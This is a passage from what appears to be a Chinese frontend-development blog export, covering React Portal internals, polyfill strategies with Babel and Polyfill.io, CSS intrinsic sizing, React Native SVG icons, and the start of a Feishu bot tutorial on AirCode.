[]); const deregisterHost = useCallback(() =&gt; &#123; dispatch(&#123; type: ACTIONS.DEREGISTER_HOST, hostName: hostName, &#125;); // eslint-disable-next-line react-hooks/exhaustive-deps &#125;, []); const addUpdatePortal = useCallback((name: string, node: ReactNode) =&gt; &#123; dispatch(&#123; type: ACTIONS.ADD_UPDATE_PORTAL, hostName, portalName: name, node, &#125;); // eslint-disable-next-line react-hooks/exhaustive-deps &#125;, []); const removePortal = useCallback((name: string) =&gt; &#123; dispatch(&#123; type: ACTIONS.REMOVE_PORTAL, hostName, portalName: name, &#125;); // eslint-disable-next-line react-hooks/exhaustive-deps &#125;, []); //#endregion return &#123; registerHost, deregisterHost, addPortal: addUpdatePortal, updatePortal: addUpdatePortal, removePortal, &#125;;&#125;; 准备工作都准备好了，看下如何收集 Portal 中的子节点（简化了下源码，只保留关键的地方） 1234567891011121314151617181920212223242526272829303132333435363738394041const PortalComponent = (&#123; children, name: _providedName &#125;) =&gt; &#123; const &#123; addPortal: addUpdatePortal, removePortal &#125; = usePortal(hostName); const handleOnMountRef = useRef&lt;Function&gt;(); const handleOnUnmountRef = useRef&lt;Function&gt;(); const handleOnUpdateRef = useRef&lt;Function&gt;(); // 在初次渲染后通过 addUpdatePortal 收集 children 到 context 中 handleOnMountRef.current = () =&gt; &#123; addUpdatePortal(name, children); &#125;; // 组件销毁时，也需要从 context 中销毁对应的 children handleOnUnmountRef.current = () =&gt; &#123; removePortal(name); &#125;; // children 变动时，同步到 context 中 handleOnUpdateRef.current = () =&gt; &#123; addUpdatePortal(name, children); &#125;; useEffect(() =&gt; &#123; handleOnMountRef.current?.(); return () =&gt; &#123; handleOnUnmountRef.current?.(); // remove callbacks refs handleOnMountRef.current = undefined; handleOnUnmountRef.current = undefined; handleOnUpdateRef.current = undefined; &#125;; &#125;, []); useEffect(() =&gt; &#123; handleOnUpdateRef.current?.(); &#125;, [children]); // 返回个 null，不渲染 children return null;&#125;; 现在已经收集到 Portal 中的子元素，下面就是将它们渲染出来了 12345678910111213141516171819202122232425262728import React, &#123; memo, useEffect &#125; from &quot;react&quot;;import &#123; usePortalState &#125; from &quot;../../hooks/usePortalState&quot;;import &#123; usePortal &#125; from &quot;../../hooks/usePortal&quot;;import type &#123; PortalHostProps &#125; from &quot;./types&quot;;const PortalHostComponent = (&#123; name &#125;: PortalHostProps) =&gt; &#123; //#region hooks const state = usePortalState(name); const &#123; registerHost, deregisterHost &#125; = usePortal(name); //#endregion //#region effects useEffect(() =&gt; &#123; registerHost(); return () =&gt; &#123; deregisterHost(); &#125;; // eslint-disable-next-line react-hooks/exhaustive-deps &#125;, []); //#endregion //#region render return &lt;&gt;&#123;state.map((item) =&gt; item.node)&#125;&lt;/&gt;; //#endregion&#125;;export const PortalHost = memo(PortalHostComponent);PortalHost.displayName = &quot;PortalHost&quot;; 渲染就很简单了，从 context 中取出节点，通过 map 渲染就出就完事了，唯一需要注意的是，Host 是有分组的，每个 Host 组件只负责渲染它这个分组内的节点即可 总结Portal 组件虽然很基础，但是却广泛应用在 Modal 等组件中，可以让我们免于手动管理组件层级问题，同时其脱离文档流的能力有时也会有些出乎意料的应用。 上面提到的都是 React 中的 Portal 组件，那么 Vue 中有没有类似的组件呢？ 在 Vue 3 之前是没有的，需要使用社区提供的开源方案 - portal-vue。Vue 3 后有了原生的组件 - Teleport。 殊途同归，可见 Portal 不局限于一个框架，是个通用的解决方案。"},{"title":"详解 Polyfill.io","path":"/2023/03/22/4903aabec5c6/","content":"今天看了篇文章「用了 babel 还需要 polyfill 吗？？？」，文章中明确回答了用了 babel 后还需要 polyfill。babel 只是一个平台，本生不提供任何功能，需要实现各种特性，必须依赖各种插件。如果 babel 没有使用任何插件，那么代码经过 babel 编译后会原封不动的返回。 什么是 Polyfill ? A polyfill is a piece of code (usually JavaScript on the Web) used to provide modern functionality on older browsers that do not natively support it. polyfill 就是一段补丁代码，它能够让当前浏览器不支持的方法通过用支持的方法重写来获得支持。比如 IE11 不支持 Promise，而我们又需要在项目里用到，写了这样的代码： 12345&lt;script&gt; Promise.resolve(&quot;bar&quot;).then(function (foo) &#123; document.write(foo); &#125;);&lt;/script&gt; 这时在 IE 下运行就会报错了 然后在此之前加上补丁 123456&lt;script src=&quot;https://cdn.jsdelivr.net/npm/promise-polyfill@8/dist/polyfill.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; Promise.resolve(&quot;bar&quot;).then(function (foo) &#123; document.write(foo); &#125;);&lt;/script&gt; 刷新浏览器，就可以正常运行了 Polyfill 方案core-js &#x2F; @babel&#x2F;polyfill Core-js 是 JavaScript 标准库中最流行也最常用的 polyfill，为最新的 ECMAScript 标准和提案提供支持，包括古老的 ES5 功能到迭代器助手等前沿选项； [@babel/polyfill](https://babeljs.io/docs/en/next/babel-polyfill.html) 这是 core-js的一个包装器，引入的是 core-js 的 stable 特性，因此从 Babel 7.4.0 之后，这个包就不再维护了，取而代之的是直接引用 core-js/stable：Babel 7.4.0 之前： 1import &quot;@babel/polyfill&quot;; Babel 7.4.0 之后改为： 12import &quot;core-js/stable&quot;;import &quot;regenerator-runtime/runtime&quot;; 因为 core-js 中 JavaScript 标准库的一个 polyfill，不仅支持最新的 ECMAScript 标准，而且连标准库提案都包含在内，因此引入这一个库，es6，es7 等新特性就可以随便写了，不然担心兼容性问题。 但是与此同时，这也带来个很大的缺点，不管你浏览器是否支持，也不管你项目是否有用到，都全量引入了，这在一些性能和带宽严苛的环境下会带来很大的麻烦。 @babel&#x2F;preset-env @babel&#x2F;preset-env 是 babel 的一组预设，其中就有 pollyfill 的相关配置 @babel&#x2F;preset-env 有两种不同的模式，可以通过 useBuiltIns选项启用，其有三个参数： entry usage false 其中，entry和 usage都可以优化 core-js 的引用，其区别在于： useBuiltIns: entry使用该选项，@babel/preset-env将找到入口文件里引入的 core-js，并替换为 targets 浏览器&#x2F;环境需要的补丁列表.babelrc 配置如下： 12345678&#123; &quot;presets&quot;: [ [&quot;@babel/env&quot;, &#123; useBuiltIns: &#x27;entry&#x27;, targets: &#123; chrome: 72 &#125; &#125;] ]&#125; 入口文件引入 core-js： 12import &quot;core-js/stable&quot;;import &quot;regenerator-runtime/runtime&quot;; 转换目标是 chrome 72 时，将被转化为： 1234import &quot;core-js/modules/es.array.unscopables.flat&quot;;import &quot;core-js/modules/es.array.unscopables.flat-map&quot;;import &quot;core-js/modules/es.object.from-entries&quot;;import &quot;core-js/modules/web.immediate&quot;; 如果转化目标是 chrome 73（完全支持 ES2019 标准库），将得到个更简短的引入： 1import &quot;core-js/modules/web.immediate&quot;; useBuiltIns: usage当启用这个选项时，@babel/preset-env只会在每个文件顶部添加仅用于当前使用的、目标环境不支持的功能的 polyfills例如： 12const set = new Set([1, 2, 3]);[1, 2, 3].includes(2); 当转化目标是老旧的低版本浏览器，比如 ie 11，上面的代码将被转化为： 1234567import &quot;core-js/modules/es.array.includes&quot;;import &quot;core-js/modules/es.array.iterator&quot;;import &quot;core-js/modules/es.object.to-string&quot;;import &quot;core-js/modules/es.set&quot;;const set = new Set([1, 2, 3]);[1, 2, 3].includes(2); 当目标是 chrome 72时，不会导入任何 polyfills，因为目标环境不需要这些 polyfills： 12const set = new Set([1, 2, 3]);[1, 2, 3].includes(2); 上面不管是 entry还是 usage都能够实现 polyfill 一定的按需引入，好是好，但是仔细想想，还是有不少问题的： 特性列表是按浏览器整理的，那怎么知道哪些特性我用了，哪些没有用到，没有用到的部分也引入了是不是也是冗余？ 补丁是打包到静态文件的，如果我配置 targets 为 chrome: 62, ie: 9，那意味着 chrome 62 也得载入 ie 9 相关的补丁，这也是一份冗余 我们是基于 core-js 打的补丁，所以只会包含 ecmascript 规范里的内容，其他比如说 dom 里的补丁，就不在此列，应该如何处理？ 手动引入前面的方案都是基于 babel 编译器的方案，虽然低效但是直观有用。如果是在一些特别在乎性能的场景，比如 H5 营销页面，宁可牺牲效率也要最求性能。那么可以手动引入 core-js&#x2F;modules 下的文件，缺啥加啥就好。 在线补丁上面啰嗦了一大堆，和本文的主题 Polyfill.io 有什么关系？前面都是为了解决如何引入特性列表的问题，有了特性列表，要做到按需下载，就需要用到在线补丁的服务了。这就到了本文的主题，polyfill.io - 目前最流行的在线补丁服务。 你可以尝试在不同的浏览器下访问 https://polyfill.io/v3/polyfill.min.js 这个文件，Polyfill.io 服务端会根据用户访问携带的浏览器 UA 返回不同的 pollfill 文件，真正做到了按需加载。你需要做的仅仅是在页面上引入这个文件： 1&lt;script src=&quot;https://polyfill.io/v3/polyfill.min.js&quot;&gt;&lt;/script&gt; 然后在 Chrome（作者用的 Chrome 是 111 版本）下的输出是： 12/* Polyfill service v3.111.0 * Disable minification (remove `.min` from URL path) for more info */ 啥都没有，因为新版本的 Chrome 已经完整支持了 ECMAScript 标准和提案的所有特性，没啥需要 pollyfill 的。 Polyfill.io 不仅提供了 CDN 服务，还开源了 polyfill-service 供我们自己搭建使用。针对国内访问 Polyfill.io 较慢的问题，可以使用阿里云的 polyfill 服务替换 1https://polyfill.alicdn.com/polyfill.min.js 阿里云不仅仅是 Polyfill.io，它还做了一些优化，在作者的 chrome 上访问上面的链接： 会加载一些额外的代码，这表现和 Polyfill.io 不一样，因此不能简单的把阿里云的 polyfill 当成 Polyfill.io 的平替，至于阿里云做了哪些优化，本文就不再讨论了，有机会另开文章介绍。 当然改方案也不是完美的，最起码它有以下两个缺点： 多了一次 http 请求 针对国内乱七八糟的浏览器是否能够准确识别从而返回需要的 polyfill 代码就不得而知了 完整 Pollyfill 方案本文关于 Polyfill 方案的介绍大部分都是来自大佬们的文章，同时也包含了一些自己的思考。是时候来个总结，关于 Pollyfill 我认为 按需特性探测 + 在线补丁 才是一个比较完整的方案：按需特性探测可以使用 @babel/preset-env配上 targets以及 useBuiltIns: usage，可以保障特性集的最小化。在线补丁可以使用 Polyfill.io 的方案（大公司可以使用自己搭建的服务），可以保障遇到目标浏览器不支持的特性是能做到按需加载，给业务再做一层兜底。 参考 https://juejin.cn/post/6845166891015602190#heading-2 https://github.com/sorrycc/blog/issues/80 https://github.com/zloirock/core-js/blob/master/docs/2019-03-19-core-js-3-babel-and-a-look-into-the-future.md","tags":["Babel","Polyfill"],"categories":["Babel","Polyfill"]},{"title":"【转载】CSS 内在尺寸教程（min-content、max-content 和 fit-content ）","path":"/2023/03/02/23c511e540c1/","content":"原文链接：Intrinsic Sizing In CSS，by Ahmad Shadeed CSS 中存在两种尺寸：内在尺寸（intrinsic）和外在尺寸（extrinsic）。为元素的 width、height 设置的固定属性值，就是指外部尺寸，这是最常用的方式。而内部尺寸，则是由元素包含的内容量决定的。本篇将会详细介绍控制内在尺寸的每个值，看看它们的使用能带来什么好处。同时，我还会举例说明这些值与 CSS Grid 布局&#x2F;其他属性如何结合使用。 外在尺寸外在尺寸是指用精确的值指定元素尺寸。举个例子：这个按钮的尺寸是 100px，这就是外在尺寸了。再比如一个 div 元素，它默认是个块级元素，就是说它的宽默认等于 100% 父元素的宽。有时，我们想要根据元素实际的内容来设置尺寸，这个时候，使用外在尺寸就没有用了。接下来，我们来看看如何是用内在属性值来解决问题的吧！ min-contentmin-content 值表示内在最小宽度（译注：这里说的不准确，也可以是“最小高度”，因此应该称为“最小尺寸”），它等于元素内容里最长的那个单词宽度。CSS Working Group (CSSWG) 的说法是：The inline size that would fit around its contents if all soft wrap opportunities within the box were taken.坦率地讲，我太理解 CSSWG 关于这个概念的定义。我自己是这么理解的：我在元素的周围包裹了一个框，元素内容（很多单词）会因此而折行，这个框的宽度将等于元素中最长的那个单词。如果我这里表述有误的话，希望大家来更正。举一个例子，有一个标题元素：{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FtRZ_OtPfVcoqr-ITCFpwD7xuf_h.webp %}大家可以看见，当元素的 width 设置成 min-content 后，其宽度等于最长单词的宽度，也就是这里的“awesome”。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FgzLpeJQ_pSJU3s670ZB_FCtopDn.webp %}A pen by Ahmad Shadeed max-contentmax-content 表示元素的内在首选宽度（intrinsic preferred width），它等于元素内容的宽。还举一个标题元素的例子，不过这次改用 max-content 了： {% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/Fm_yZfJsk47dmWGNGsijGxox6iU_.webp %}注意观察，元素宽度等于标题宽度了。这个宽度是动态的，随着标题内容的改变，max-content 所代表的值也相应改变。 fit-cotent这个属性可以看成是 min-content 和 max-content 的结合。搜索的时候，我发现 Stackoverflow 上的这个回答我很喜欢：fit-content 默许使用 max-content；如果 available &lt; max-content，那就使用 available；如果 available &lt; min-content，那就使用 min-content。画一个流程图表示，就是下面这样的：{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FkdYftEm0qKZmalSXlnbYCwn1_u8.webp %}注意，这里的“available”表示元素在视口中的可用空间。 🤔 译注上面的流程图跟 Stackoverflow 上的回答比起来，并不十分清晰，反而是后者更容易理解起来。关于 Stackoverflow 上的回答我的理解如下： fit-content 属性到底取用何值，跟当前元素的可用空间（available）是紧密相关的。 如果可用空间充足，那就用你元素的 max-conetnt 又何妨，反正够装你的。 如果可用空间不够充裕，比 max-conetnt 小点，那就得用可用空间的值了，这才显得合适（fit），不会导致内容越界。 如果可用空间很少，甚至比 min-conetnt 还小，那不好意思，得用 min-content 了，不然显示会很难看，就不合适了。 让我们举个例子看看它是如何工作的。查看下面的 GIF 图，观察标题尺寸是如何随着视口的变化做调整的。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FpVkUsmZeYqELD9mpwyYOqmO_fY4.webp %}我们再回顾一下关于 fit-content 的知识：如果当前的可用空间比 max-content 还大的话，width 就等于 max-content；如果可用空间比 max-content 的小的话，那么 width 就等于可用空间的宽了；最后，如果可用空间比 min-content 还小，那么 width 就等于 min-content。到目前为止，我解释完了每一个内在值。让我们转向真实的案例来看下吧。 使用案例figure 和 caption现在我们假设有一个带 caption 的 figure，因为它是个块级元素，因此默认等于 100% 父元素宽度的。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FpevdR73mijvM8Kpey8KtVkJSSfT.webp %}我们预期的行为是希望 figure 包裹图像的，使用 max-content 就能取得这些效果，让 figure 与内容（最大）宽度一样。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/Fi0GQKgdJDUnRVmopnG-PsSf1aKB.webp %}但有一个问题，如果图片比视口范围还大的话，这时因为 figure 的宽度就等于图片的宽度，因此就会导致水平滚动条的出现。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/Fsy7xTU9QPwh5QQ71cXCb9Se3eTN.webp %}为了解决这个问题，我们就要为图片使用 fit-content 了。它不会让大图片超出视口之外显示。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FmBR2xDDEZ_wOuP_cJoYFJY4GPjI.webp %}A pen by Ahmad Shadeed 带分隔符的标题{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/Fg6IE0jL4AmsT8T79pTO_gXr9fCY.webp %}在这个例子里，“Top Stories”要折成两行显示。宽度还是动态的，就是说不管实际标题如何，都需要折行。为了实现这个效果，我们可以使用 min-content。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FjZi8QGUwpIe_wiMi8JfjtoqYx1l.webp %}A pen by Ahmad Shadeed 带下划线的标题内在值的另一个有趣的用例是带边框的标题，要求边框跟标题内容一样长。考虑下图：{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FrQaCTWE9QHrO2jV2wAOtfbiVKjl.webp %}注意，标题是个块状元素。为了得到上述的效果，以前的做法是将内容包装在 span 标签里，给 span 设置边框效果。当然，我们还可以借助 fit-content 来让标题宽度与内容一样长。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FinLTwNip8oB6ldlidV8aWp1x0lT.webp %}A pen by Ahmad Shadeed 导航{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FjOJhjg_n5NSHkM4Lntp8HzphsGX.webp %}如果一个页面导航的宽度是基于内容的。那么，可以通过使用 max-content，轻松实现效果：Demo Todo 列表在网上找内在值的使用案例的时候，看到了 一篇文章，将我吸引了。考虑下面的例子：{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/Fn8CuDp1kJ84cpVPwZ2g4NnpwP6s.webp %}这个 Todo 列表包含：页眉、列表和页脚。不管有多少列表项，中间部分的高度都应该是 100% - header - footer。为了实现这个效果，我们可以将 CSS Grid 与 min-content 搭配使用。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/Fo0gNHQKDJc8iHX_679G7rZBkmQQ.webp %}你可能想知道，如果我们不使用 min-content，会是什么结果呢？好吧，来看看：{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/Fk3pI3JFH6okgDWxt39749dY4MMs.webp %} 聊天窗口设想构建一个聊天程序。在下面的示例里，布局结构与 Todo 列表非常相似。当没有\\聊天记录，并且没有使用 min-content 时，就会导致布局遭到破坏。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/Frx1z8upl4t059p3TOoz84GfPBdO.webp %}Demo Hero假设我们页面 header 里包含一个 Hero 组件。我们的目标是让这个 Hero 组件实现动态布局，占据一屏里剩下的空间。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FsE-VgmSMzDVun5r8vPFb6s-VkS7.webp %}有两行内容，第一行使用的是最小内容高度，而第二行则可以扩展、填充完剩下的可用空间。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FgIVnlGa3rjpPf8bkZHGblb1VusW.webp %}A pen by Ahmad Shadeed Sidebar 和 Main我总是想知道为什么我们非要给侧边栏一个固定宽度呢。如果它的宽度是基于内容的呢？比如说，它有一个基于内容的最小宽度和一个最大宽度？我们来试试。通过使用 CSS Grid fit-content 函数，我们可以确保侧边栏的宽度不会超过 150px，并且可以在内容很短的情况下缩小到 150px 以下。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/Fno0q9bzxpApbUpZFas7BpCfF5Tg.webp %}当侧边栏的内容很少时，它会缩小一点：{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FjbIJ-6CDjFLpks6vejyFQjE3GH8.webp %} 🤔 译注这的 fit-content() 文中并没有讲到。可以这样简单理解：一般使用这个功能函数时，所用参数一般都是小于元素的 max-content 值的。比如 fit-content(150px)，那么说 150px 是小于元素 max-content 值的。这种情况下，元素最终的渲染尺寸是介于 min-content ~ 150px 之间的。具体是多少还要看当前的可用空间，如果可用空间充足，拿就显示最大的 150px，如果可用空间小，那么就取 min-content ~ 150px 之间的某个值，如果可用空间不足（比 min-content 还小），那就用最小值 min-content，不能再小了。当然，如果 fit-content() 里的值比元素 max-content 还大，那么元素最终的渲染尺寸是介于 min-content ~ max-content 之间的。具体是多少还要看当前的可用空间，与上面类似。反正，fit-content() 返回的最小值是 min-content，不能比 min-content 更小了。更多信息，查看 MDN 上的 fit-content() 文档。 标题和描述我们有一个标题和一个描述文本。描述文字的宽度不能超过主标题的宽度。对我来说，这是一个有趣的用例，我以前认为它不可能仅用 CSS 就能实现。看下下面的模型。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FsWjjXuCvxRrBMXsltt3q8w9pcol.webp %}为了实现上述功能，我们需要将 min-content 设置为包装元素的宽度，而为标题元素设置 width: max-content。请注意，上面代码需要在移动端做些调整额，否则可能会导致导致水平滚动条的出现。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/FuW5tPG34bDauPrzXoYveYmj9xvf.webp %}A pen by Ahmad Shadeed 浏览器兼容性根据 Can I Use 数据，除了 Microsoft Edge (EdgeHTML) 之外的所有主流浏览器都支持内在值的设置了。注意：Microsoft Edge (Chromium) 从发布的第一个版本（79）就已经支持了。{% image https://cdn.jsdelivr.net/gh/bijinfeng/image-hosting/yuque/Fvk8LcDd3ZKLw6LVxlwAwd7lF89U.webp %}（正文完） 转载自：https://juejin.cn/post/6844904065692909576#heading-6","tags":["CSS"],"categories":["CSS"]},{"title":"React Native 组件库 - 图标组件","path":"/2023/02/20/44cb562ca4b6/","content":"背景图标组件是组件库里不可或缺的一个组件，随着前端的不断发展，其实现方式也是在不断的迭代，从雪碧图到字体图标再到 svg 图标，并且再配合 Typescript 和 Tree Shaking 图标组件也能轻松的获得代码提示和按需加载。 在 web 中使用 svg 图标很简单，浏览器原生支持 svg 元素，但是 React Native 内置的组件中没有 SVG 组件，要使用 SVG，需要自己封装。幸好社区里早早有大佬封装好了 - react-native-svg，我们直接拿来使用就好了。 使用 react-native-svg 和我们在 React 中使用 svg 很像，都有 Svg、Path组件，不过一个是原生的，一个需要从 react-native-svg 中引入： React: 1234567891011import * as React from &quot;react&quot;;import &#123; SVGProps &#125; from &quot;react&quot;;const SvgComponent = (props: SVGProps&lt;SVGSVGElement&gt;) =&gt; ( &lt;svg width=&#123;48&#125; height=&#123;1&#125; xmlns=&quot;http://www.w3.org/2000/svg&quot; &#123;...props&#125;&gt; &lt;title&gt;&#123;&quot;Rectangle 5&quot;&#125;&lt;/title&gt; &lt;path d=&quot;M0 0h48v1H0z&quot; fill=&quot;#063855&quot; fillRule=&quot;evenodd&quot; /&gt; &lt;/svg&gt;);export default SvgComponent; React Native： 1234567891011import * as React from &quot;react&quot;;import Svg, &#123; SvgProps, Path &#125; from &quot;react-native-svg&quot;;/* SVGR has dropped some elements not supported by react-native-svg: title */const SvgComponent = (props: SvgProps) =&gt; ( &lt;Svg width=&#123;48&#125; height=&#123;1&#125; xmlns=&quot;http://www.w3.org/2000/svg&quot; &#123;...props&#125;&gt; &lt;Path d=&quot;M0 0h48v1H0z&quot; fill=&quot;#063855&quot; fillRule=&quot;evenodd&quot; /&gt; &lt;/Svg&gt;);export default SvgComponent; 在 React Native 使用 svg，基本就相当于把代码从 React 中 copy 过来，将所有的 svg 元素换成驼峰样式的自定义组件，然后从 react-native-svg 中引入。 这里推荐个工具 SVGR Playground，可以将 svg 转换成 React &amp; React Native 组件，省去手动修改的麻烦。 图标管理上面介绍了在 React Native 中使用 svg 图标的姿势，但是一个图标组件库中，少则几十多则几百个图标，如何管理这些图标就是一个问题了。 最简单粗暴的方式就是直接放在源码了，但是当你需要修改和预览图标时，你就会体验到什么到痛苦。 更好的方式是借助图标管理平台，比如 iconfont，iconpark 等，这里推荐 iconfont，原因见下面： 图标组件生成图标管理的问题解决了，接下来就要解决如何将 iconfont 上的图标转换成可使用的图标组件的问题了，这里需要借助个工具 - react-native-iconfont-cli，这里贴下 react-native-iconfont-cli 需要解决的痛点，体验下它的强大之处：引用自：https://github.com/iconfont-cli/react-native-iconfont-cli 通常地，当我们想在 RN 里使用 iconfont，我们可能会借助 react-native-vector-icons 导入 ttf 字体文件，或者直接手动下载各个 svg 文件到本地，然后单个使用。使用 ttf 字体有一个弊端，就是每次更新图标，都要相应的更新 ttf 文件，然后再次打包发布 APP。而且 ttf 不支持多种色彩的图标，导致所有图标都是单色。如果你是借助 react-native-vector-icons，该库内置了 10 多套 ttf 文件，合起来有 2M 左右；你可能用不到它们，但是它们仍然会被打包进你的 APP 里。下载 svg 到本地也不方便，因为你需要额外维护一份图标字体，有可能造成线上和本地的图标不一致问题。而且如果你想动态地改变 svg 的渲染色彩，基本上是不可能的，只能渲染原图的颜色。 为了解决这些问题，我用纯 Javascript 实现 iconfont 到 React 组件的转换操作，不需要依赖 ttf 字体文件，不需要手动下载图标到本地。 如何使用就不过多介绍了，README 里写的很清楚，这里贴下我的组件库中使用的配置： 123456&#123; &quot;symbol_url&quot;: &quot;//at.alicdn.com/t/font_2952809_4bb6cudcj1k.js&quot;, &quot;use_typescript&quot;: true, &quot;save_dir&quot;: &quot;./src&quot;, &quot;default_icon_size&quot;: 18&#125; 发版图标的管理和生成都说完了，一般情况下到这里就该结束了，但是我的组件库中图标是单独抽出来的一个包，这里还需要说下组件的打包和发版问题。 打包的话在上一篇文章 - React Native 组件库 - 脚手架 里介绍了 React Native 的一个优秀的打包工具 react-native-builder-bob，这里我们图标组件依然使用它来打包，如何使用可以参考我上一篇文章或者直接看官方文档，这里贴下最后使用的完整配置： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&#123; &quot;name&quot;: &quot;@rn-vant/icons&quot;, &quot;version&quot;: &quot;0.2.0&quot;, &quot;description&quot;: &quot;rn-vant icons for react-native&quot;, &quot;keywords&quot;: [&quot;react-native&quot;, &quot;rn-vant&quot;, &quot;icon&quot;], &quot;author&quot;: &quot;bijinfeng &lt;bijinfeng@bytedance.com&gt;&quot;, &quot;license&quot;: &quot;MIT&quot;, &quot;main&quot;: &quot;lib/commonjs/index&quot;, &quot;module&quot;: &quot;lib/module/index&quot;, &quot;types&quot;: &quot;lib/typescript/index.d.ts&quot;, &quot;react-native&quot;: &quot;src/index&quot;, &quot;source&quot;: &quot;src/index&quot;, &quot;directories&quot;: &#123; &quot;lib&quot;: &quot;lib&quot;, &quot;test&quot;: &quot;__tests__&quot; &#125;, &quot;files&quot;: [&quot;lib&quot;, &quot;src&quot;], &quot;publishConfig&quot;: &#123; &quot;access&quot;: &quot;public&quot; &#125;, &quot;scripts&quot;: &#123; &quot;generate&quot;: &quot;npx iconfont-rn&quot;, &quot;build&quot;: &quot;bob build&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;react-native-builder-bob&quot;: &quot;^0.18.2&quot;, &quot;react-native-iconfont-cli&quot;: &quot;^2.2.3&quot;, &quot;react-native-svg&quot;: &quot;^12.4.4&quot;, &quot;typescript&quot;: &quot;^4.4.3&quot; &#125;, &quot;peerDependencies&quot;: &#123; &quot;react&quot;: &quot;*&quot;, &quot;react-native&quot;: &quot;*&quot;, &quot;react-native-svg&quot;: &quot;*&quot; &#125;, &quot;react-native-builder-bob&quot;: &#123; &quot;source&quot;: &quot;src&quot;, &quot;output&quot;: &quot;lib&quot;, &quot;targets&quot;: [ &quot;commonjs&quot;, &quot;module&quot;, [ &quot;typescript&quot;, &#123; &quot;project&quot;: &quot;tsconfig.build.json&quot; &#125; ] ] &#125;&#125; 发布到 npm 就不过多介绍，老生常谈的问题了，一般 Mono Repo 项目里都有自己的发布命令，比如，lerna 项目就用 lerna publish，一般 Multi Repo 项目使用 npm publish就可以了。如果不想手动发布，可以借助 CI&#x2F;CD 工具做到自动发布，这些不在本文讨论范围内，就不多赘述了。 总结得益于前端强大的社区，在 React Native 中使用 SVG 图标并不是一件多么麻烦的事情，借助一些工具，甚至能做到开发体验丝滑到飞起。有时不得不感叹一句前端发展太快了，早已脱离了刀耕火种的时代，各种先进的工具不断涌现，目不暇接，现在最大的问题反而是工具太多，学不过来的问题！","tags":["React","React Native"],"categories":["React Native","组件库"]},{"title":"使用 AirCode 开发飞书机器人","path":"/2023/02/14/7a3b3abbe76f/","content":"在线文档：https://docs-cn.aircode.io/ AirCode 是一个在线开发和部署 Node.js 应用的平台，为全栈工程师量身定制，目标是让开发变得简单。 并且提供一个简易的 WebIDE 和开箱即用的云服务，让开发者无需再操心后端选型、环境搭建和线上运维等一系列繁琐之事，只需打开浏览器即可完成产品开发，并部署到全球节点。 但是 AirCode 有资源限制，不建议用于高频的服务，但是我们要开发的机器人接口调用频率不会特别高，因此正适合 AirCode。 效果 @机器人 告诉它你想听的歌曲名字，机器人会返回给你最匹配的三条，点击「打开播放器」，会在右侧弹出在线播放器。 音乐播放器播放器使用 Github 上的开源项目「music-motion-x」，该项目是 SSR 服务端渲染项目，但是我们需要部署到 Github Pages 上，因此需要一些改造。 使用 Vite 新建个 react + ts 的模板： 1yarn create vite my-vue-app --template react-ts 接下来安装并配置 eslint、commitlint、husky和lint-staged等工具，配置细节本文就不赘述了，详细配置见 https://github.com/bijinfeng/music-motion-x 迁移代码至新项目中 添加 Github Action 12345678910111213141516171819202122232425262728name: Build and Deployon: push: branches: - masterjobs: build-and-deploy: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@master with: submodules: true - name: Install Dependencies run: yarn install - name: Generate run: yarn build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125; publish_dir: ./dist 提交代码至 Github 就可以触发自动部署了 新建飞书应用在飞书开放平台新建个应用，图标和名称自定义，添加应用后添加「网页」和「机器人」应用： 网页应用将主页地址配置成 Github Page 的地址 机器人应用需要配置个消息请求地址，可以先不填，等到 AirCode 开发完成后回头再来填。 接下来我们还需要申请权限和订阅事件，用于机器人消息的收发： 订阅事件：只需要「接收消息」的事件就行，请求地址配置成上面 👆 机器人请求地址 申请权限：以下权限是必须要有的，其它权限按需申请 机器人 webhook 接口开发上面应用和机器人配置好后，接下来就需要开发 webhook 接口供机器人订阅。 首先需要新建个应用，然后安装两个依赖： axios - 发送 http 请求 @larksuiteoapi&#x2F;node-sdk - 飞书开放接口 SDK 新建 client.js 文件 1234567const lark = require(&quot;@larksuiteoapi/node-sdk&quot;);module.exports = new lark.Client(&#123; appId: process.env.app_id, appSecret: process.env.app_secret, appType: lark.AppType.SelfBuild,&#125;); app_id 和 app_secret这两个环境变量从飞书开放平台获取后，配置到 AirCode 的 Enviroments Tab 下： 新建 image.js 文件 飞书的消息卡片要插入图片，必须要先将图片上传到飞书中才行，因此该文件的作用是将网络图片上传到飞书中，并返回图片的 image_key。 123456789101112131415161718192021222324252627282930313233343536373839const aircode = require(&quot;aircode&quot;);const axios = require(&quot;axios&quot;);const querystring = require(&quot;querystring&quot;);const client = require(&quot;./client&quot;);module.exports = async (&#123; url &#125;) =&gt; &#123; // 如果已经上传过了，从数据库中取出缓存 const 